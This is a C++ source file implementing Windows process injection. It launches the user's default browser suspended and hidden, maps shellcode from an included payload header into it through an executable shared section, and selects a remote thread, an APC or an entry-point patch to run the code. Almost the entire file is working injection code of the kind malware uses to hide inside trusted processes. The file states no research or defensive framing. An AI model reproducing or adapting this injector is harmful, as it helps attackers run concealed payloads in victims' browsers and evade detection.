#include <Windows.h>
#include <iostream>

#include "main.h"
#include "payload.h"

#define ADD_THREAD
//#define ADD_APC
//#define PATCH_EP

using namespace std;

bool get_default_browser(LPWSTR lpwOutPath, DWORD szOutPath)
{
    HKEY phkResult;
    DWORD iMaxLen = szOutPath;

    LSTATUS res = RegOpenKeyEx(HKEY_CLASSES_ROOT, L"HTTP\\shell\\open\\command", 0, 1u, &phkResult);
    if (res != ERROR_SUCCESS) {
        cout << "Failed with value " << res << endl;
        return false;
    }

    res = RegQueryValueEx(phkResult, NULL, NULL, NULL, (LPBYTE) lpwOutPath, (LPDWORD) &iMaxLen);
    if (res != ERROR_SUCCESS) {
        cout << "Failed with value " << res << endl;
        return false;
    }
    wcout << lpwOutPath << endl;
    return true;
}

bool get_calc_path(LPWSTR lpwOutPath, DWORD szOutPath)
{
    ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\calc.exe", lpwOutPath, szOutPath);
    wcout << lpwOutPath << endl;
    return true;
}

PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSize)
{
    HANDLE hSection = NULL;
    OBJECT_ATTRIBUTES hAttributes;
    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));

    LARGE_INTEGER maxSize;
    maxSize.HighPart = 0;
    maxSize.LowPart = shellcodeSize;
    NTSTATUS status = NULL;
    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
    {
        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section handle: %x\n", hSection);

    PVOID sectionBaseAddress = NULL;
    SIZE_T viewSize = 0;
    SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE

    // map the section in context of current process:
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE))!= STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section BaseAddress: %p\n", sectionBaseAddress);

    memcpy (sectionBaseAddress, shellcode, shellcodeSize);
    printf("Shellcode copied!\n");

    //map the new section into context of opened process
    PVOID sectionBaseAddress2 = NULL;
    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE))!= STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }

    //unmap from the context of current process
    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
    ZwClose(hSection);

    printf("Section mapped at address: %p\n", sectionBaseAddress2);
    return sectionBaseAddress2;
}

int main()
{
   if (load_undoc_ntdll_functions() == FALSE) {
        printf("Failed to load NTDLL function\n");
        return (-1);
    }

    WCHAR lpwOutPath[MAX_PATH];
    get_default_browser(lpwOutPath, MAX_PATH);

    STARTUPINFO si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcess(
            NULL,
            lpwOutPath,
            NULL, //lpProcessAttributes
            NULL, //lpThreadAttributes
            NULL, //bInheritHandles
            DETACHED_PROCESS|CREATE_SUSPENDED|CREATE_NO_WINDOW, //dwCreationFlags
            NULL, //lpEnvironment 
            NULL, //lpCurrentDirectory
            &si, //lpStartupInfo
            &pi //lpProcessInformation
        ))
    {
        printf("[ERROR] CreateProcess failed, Error = %x\n", GetLastError());
        return (-1);
    }

#ifdef ADD_THREAD
    LPVOID remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
    run_shellcode_in_new_thread1(pi.hProcess, remote_shellcode_ptr);
    ResumeThread(pi.hThread); //main Thread
#elif ADD_APC
    LPVOID remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
    add_shellcode_to_apc(pi.hThread, remote_shellcode_ptr);
#elif PATCH_EP
    paste_shellcode_at_ep(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
    ResumeThread(pi.hThread); //main Thread
#else
    ResumeThread(pi.hThread); //main Thread
#endif
    //close handles
    ZwClose(pi.hThread);
    ZwClose(pi.hProcess);
    TerminateProcess(GetCurrentProcess(), STATUS_SUCCESS);
	return 0;
}
